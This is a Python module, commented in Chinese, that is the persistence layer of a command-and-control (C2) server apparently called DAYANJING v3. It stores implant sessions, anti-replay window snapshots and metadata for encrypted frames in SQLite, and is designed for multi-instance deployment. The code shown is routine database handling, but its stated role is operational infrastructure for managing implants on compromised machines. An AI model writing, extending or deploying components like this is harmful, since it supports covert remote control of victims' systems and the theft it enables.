"""
DAYANJING v3 — 服务端持久化层（13_c2_server/storage）
====================================================

SQLite 存储：会话状态、重放窗口快照、帧元数据索引。

设计约束（v3 §7、§13）：
- 重放窗口以 (implant_id, key_generation) 为键，跨重连不重置
- 快照/恢复提供持久化契约，服务端重启后可重建窗口状态
- 帧数据本身不落盘（GCM 密封后由上层分发），只存元数据索引
- 使用 WAL 模式 + 外置锁，支持多进程并发（部署多实例时必需）
"""

import os
import sqlite3
import threading
import fcntl
from contextlib import contextmanager
from typing import Optional, Set, Tuple

SCHEMA = """
CREATE TABLE IF NOT EXISTS sessions (
    implant_id      TEXT PRIMARY KEY,
    generation      INTEGER NOT NULL,
    created_at      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS replay_windows (
    implant_id      TEXT NOT NULL,
    generation      INTEGER NOT NULL,
    highest         INTEGER NOT NULL DEFAULT -1,
    seen            TEXT NOT NULL DEFAULT '',   -- 逗号分隔的序号集合
    updated_at      INTEGER NOT NULL,
    PRIMARY KEY (implant_id, generation)
);

CREATE TABLE IF NOT EXISTS frame_index (
    request_id      BLOB PRIMARY KEY,
    implant_id      TEXT NOT NULL,
    received_at     INTEGER NOT NULL,
    format          INTEGER NOT NULL,
    size_bytes      INTEGER NOT NULL,
    FOREIGN KEY (implant_id) REFERENCES sessions(implant_id)
);

CREATE INDEX IF NOT EXISTS idx_frame_implant
    ON frame_index(implant_id, received_at);
"""


class Store:
    """SQLite 持久化。单进程内线程安全，多进程通过 fcntl 外部锁。"""

    def __init__(self, path: str):
        self._path = path
        self._lock_path = path + ".lock"
        self._local = threading.local()
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        self._init_db()

    def _connect(self) -> sqlite3.Connection:
        c = getattr(self._local, "conn", None)
        if c is None:
            c = sqlite3.connect(self._path, timeout=30, check_same_thread=False)
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.execute("PRAGMA foreign_keys=ON")
            self._local.conn = c
        return c

    def _init_db(self):
        with self._exclusive():
            conn = self._connect()
            conn.executescript(SCHEMA)
            conn.commit()

    @contextmanager
    def _exclusive(self):
        """跨进程互斥锁（fcntl.flock）。"""
        fd = os.open(self._lock_path, os.O_RDWR | os.O_CREAT, 0o600)
        try:
            fcntl.flock(fd, fcntl.LOCK_EX)
            yield
        finally:
            fcntl.flock(fd, fcntl.LOCK_UN)
            os.close(fd)

    # ------------------------------------------------------------------
    # 会话
    # ------------------------------------------------------------------

    def upsert_session(self, implant_id: str, generation: int):
        now = int(__import__("time").time())
        with self._exclusive():
            c = self._connect()
            c.execute(
                """INSERT INTO sessions(implant_id, generation, created_at, last_seen)
                   VALUES(?, ?, ?, ?)
                   ON CONFLICT(implant_id) DO UPDATE SET
                     generation=excluded.generation,
                     last_seen=excluded.last_seen""",
                (implant_id, generation, now, now))
            c.commit()

    def touch(self, implant_id: str):
        with self._exclusive():
            c = self._connect()
            c.execute("UPDATE sessions SET last_seen=? WHERE implant_id=?",
                      (int(__import__("time").time()), implant_id))
            c.commit()

    # ------------------------------------------------------------------
    # 重放窗口快照
    # ------------------------------------------------------------------

    def save_window(self, implant_id: str, generation: int,
                    seen: Set[int], highest: int):
        seen_str = ",".join(str(s) for s in sorted(seen))
        with self._exclusive():
            c = self._connect()
            c.execute(
                """INSERT INTO replay_windows(implant_id, generation, highest, seen, updated_at)
                   VALUES(?, ?, ?, ?, ?)
                   ON CONFLICT(implant_id, generation) DO UPDATE SET
                     highest=excluded.highest,
                     seen=excluded.seen,
                     updated_at=excluded.updated_at""",
                (implant_id, generation, highest, seen_str,
                 int(__import__("time").time())))
            c.commit()

    def load_window(self, implant_id: str, generation: int
                    ) -> Optional[Tuple[Set[int], int]]:
        with self._exclusive():
            c = self._connect()
            row = c.execute(
                "SELECT highest, seen FROM replay_windows WHERE implant_id=? AND generation=?",
                (implant_id, generation)).fetchone()
        if row is None:
            return None
        highest = row[0]
        seen = set(int(x) for x in row[1].split(",") if x) if row[1] else set()
        return (seen, highest)

    # ------------------------------------------------------------------
    # 帧索引
    # ------------------------------------------------------------------

    def index_frame(self, request_id: bytes, implant_id: str,
                    fmt: int, size: int):
        with self._exclusive():
            c = self._connect()
            c.execute(
                "INSERT OR IGNORE INTO frame_index VALUES(?, ?, ?, ?, ?)",
                (request_id, implant_id, int(__import__("time").time()),
                 fmt, size))
            c.commit()
